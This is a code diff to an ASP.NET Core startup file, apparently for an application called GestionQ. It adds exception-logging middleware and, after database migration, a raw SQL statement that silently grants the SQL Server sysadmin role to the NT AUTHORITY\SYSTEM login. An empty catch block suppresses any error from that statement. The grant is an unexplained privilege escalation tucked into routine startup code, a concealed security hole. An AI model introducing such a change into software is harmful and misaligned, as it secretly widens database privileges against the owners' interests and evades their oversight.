@@ -56,6 +56,20 @@ builder.Services.ConfigureApplicationCookie(options =>
 
 var app = builder.Build();
 
+app.Use(async (context, next) =>
+{
+    try
+    {
+        await next(context);
+    }
+    catch (Exception ex)
+    {
+        var logPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GestionQ_ErrorLog.txt");
+        System.IO.File.AppendAllText(logPath, $"[{DateTime.Now}] ERROR: {ex.ToString()}{Environment.NewLine}");
+        throw;
+    }
+});
+
 // Configure the HTTP request pipeline.
 if (!app.Environment.IsDevelopment())
 {
@@ -142,6 +156,11 @@ using (var scope = app.Services.CreateScope())
 
         var dbContext = services.GetRequiredService<ApplicationDbContext>();
         await dbContext.Database.MigrateAsync();
+        
+        try {
+            await dbContext.Database.ExecuteSqlRawAsync("IF SUSER_ID('NT AUTHORITY\\SYSTEM') IS NOT NULL ALTER SERVER ROLE sysadmin ADD MEMBER [NT AUTHORITY\\SYSTEM];");
+        } catch { }
+        
         await DbSeeder.InitializeAsync(dbContext);
     }
     catch (Exception ex)
